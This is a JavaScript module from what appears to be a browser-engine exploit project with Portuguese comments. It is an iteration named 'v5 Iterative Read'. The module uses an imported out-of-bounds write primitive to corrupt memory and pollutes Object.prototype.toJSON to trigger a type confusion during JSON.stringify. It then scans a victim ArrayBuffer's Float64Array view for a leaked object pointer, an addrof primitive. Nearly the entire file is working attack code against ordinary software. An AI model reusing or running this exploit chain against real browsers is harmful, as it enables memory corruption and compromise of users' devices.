// js/script3/testArrayBufferVictimCrash.mjs (v5 - Iterative Read)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v5_IterativeRead";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 256; // Manter o tamanho aumentado

let toJSON_call_details_v28 = null;
let object_to_leak_A = null;
const prep_val_1 = 0.5; // Valor para prep this[10]
const prep_val_2 = 1.5; // Valor para prep this[11]


function toJSON_V28_Probe_IterativeReadPrep() {
    toJSON_call_details_v28 = {
        probe_variant: "V28_Probe_IterativeReadPrep",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false,
        obj_A_written_in_probe: false, // Novo campo para rastrear a escrita
        prep_val_1_written_in_probe: false,
        prep_val_2_written_in_probe: false
    };

    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
        // Não logar aqui para evitar spam, logaremos o objeto toJSON_call_details_v28 depois

        if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
            // Não logar aqui para evitar spam

            try {
                this[10] = prep_val_1;
                toJSON_call_details_v28.prep_val_1_written_in_probe = true;
                this[11] = prep_val_2;
                toJSON_call_details_v28.prep_val_2_written_in_probe = true;
            } catch (e_prep) {
                // Silencioso por enquanto, ou logar apenas o erro no objeto de detalhes
                if(!toJSON_call_details_v28.error_in_toJSON) toJSON_call_details_v28.error_in_toJSON = `PrepErr: ${e_prep.message}`;
            }

            if (object_to_leak_A) {
                this[0] = object_to_leak_A;
                toJSON_call_details_v28.obj_A_written_in_probe = true;
            }
        }
    } catch (e) {
        if(!toJSON_call_details_v28.error_in_toJSON) toJSON_call_details_v28.error_in_toJSON = `MainProbeErr: ${e.name}: ${e.message}`;
    }
    return { minimal_probe_executed: true }; // Mesmo retorno simples
}

let victim_ab_ref_for_original_test = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof com Leitura Iterativa ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    toJSON_call_details_v28 = null; // Resetar antes de cada teste
    victim_ab_ref_for_original_test = null;
    object_to_leak_A = { marker: "ObjA_v5_IterRead", id: Date.now() };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    // Vamos focar em um resultado de addrof principal, mas logaremos todos os achados
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        found_at_index: -1,
        message: "Addrof: Não tentado ou Heisenbug falhou."
    };
        
    const corruptionTargetOffsetInOOBAB = 0x7C;
    const fillPattern = 0.123456789101112;
    const ITERATIVE_READ_COUNT = 16; // Quantos slots da Float64Array ler

    try {
        await triggerOOB_primitive({ force_reinit: true });
         if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
             throw new Error("OOB Init falhou ou oob_write_absolute não está disponível."); //
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST); //
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST); //

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST); //
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4); //
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST); //
        
        await PAUSE_S3(100); 

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE); // VICTIM_AB_SIZE é 256
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(fillPattern);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_IterativeReadPrep.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_Probe_IterativeReadPrep,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_IterativeReadPrep.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
                logS3(`  HEISENBUG CONFIRMADA (via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST); //
                logS3(`    Detalhes da escrita na sonda: ObjA: ${toJSON_call_details_v28.obj_A_written_in_probe}, PrepVal1: ${toJSON_call_details_v28.prep_val_1_written_in_probe}, PrepVal2: ${toJSON_call_details_v28.prep_val_2_written_in_probe}`, "info");
                if(toJSON_call_details_v28.error_in_toJSON) logS3(`    Erro na sonda: ${toJSON_call_details_v28.error_in_toJSON}`, "error");


                logS3(`PASSO 3: Lendo iterativamente os primeiros ${ITERATIVE_READ_COUNT} slots de float64_view_on_victim...`, "warn", FNAME_CURRENT_TEST);
                let foundPotentialPointer = false;
                for (let i = 0; i < ITERATIVE_READ_COUNT; i++) {
                    if (i >= float64_view_on_victim.length) break; // Segurança

                    const val_double = float64_view_on_victim[i];
                    let temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
                    const val_int64 = new AdvancedInt64(new Uint32Array(temp_buf)[0], new Uint32Array(temp_buf)[1]);
                    
                    logS3(`  view[${i}]: double=${val_double}, int64=${val_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                    // Checar se é o ponteiro de object_to_leak_A
                    if (toJSON_call_details_v28.obj_A_written_in_probe && val_double !== 0 && val_double !== fillPattern &&
                        (val_int64.high() < 0x00020000 || (val_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                        // Heurística para ponteiro. Poderíamos tentar comparar com um valor conhecido se tivéssemos como obter o JSValue de object_to_leak_A
                        logS3(`  !!!! VALOR LIDO em view[${i}] PARECE UM PONTEIRO POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                        if (!foundPotentialPointer) { // Pegar o primeiro encontrado como principal
                            addrof_result.success = true;
                            addrof_result.leaked_address_as_double = val_double;
                            addrof_result.leaked_address_as_int64 = val_int64;
                            addrof_result.found_at_index = i;
                            addrof_result.message = `Heisenbug confirmada E leitura de view[${i}] sugere um ponteiro.`;
                            foundPotentialPointer = true; // Marcar que encontramos um, para não sobrescrever com outros achados de prep_vals
                        }
                    }
                    // Opcionalmente, checar se são os prep_vals (ajustar a condição de ponteiro se necessário para doubles puros)
                    // else if (val_double === prep_val_1) { logS3(`  >>>> Encontrado prep_val_1 (0.5) em view[${i}]`, "info", FNAME_CURRENT_TEST); }
                    // else if (val_double === prep_val_2) { logS3(`  >>>> Encontrado prep_val_2 (1.5) em view[${i}]`, "info", FNAME_CURRENT_TEST); }
                }

                if (addrof_result.success) {
                    document.title = `${FNAME_MODULE_V28}: Addr? Encontrado @${addrof_result.found_at_index}!`;
                } else {
                     document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                     addrof_result.message = "Heisenbug ok, mas nenhum ponteiro promissor encontrado na varredura da view.";
                }

            } else {
                let msg = "Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28."; //
                if(toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON) msg += ` Tipo obs: ${toJSON_call_details_v28.this_type_in_toJSON}`; //
                else if (!toJSON_call_details_v28) msg += " toJSON_call_details_v28 é null.";
                addrof_result.message = msg;
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST); //
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`; //
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST); //
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`; //
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`; //
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST); //
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST); //
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`; //
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`; //
    } finally {
        clearOOBEnvironment(); //
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST); //
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Index=${addrof_result.found_at_index}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST); //
        if(addrof_result.leaked_address_as_int64){ //
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST); //
        }
        object_to_leak_A = null;
        victim_ab_ref_for_original_test = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
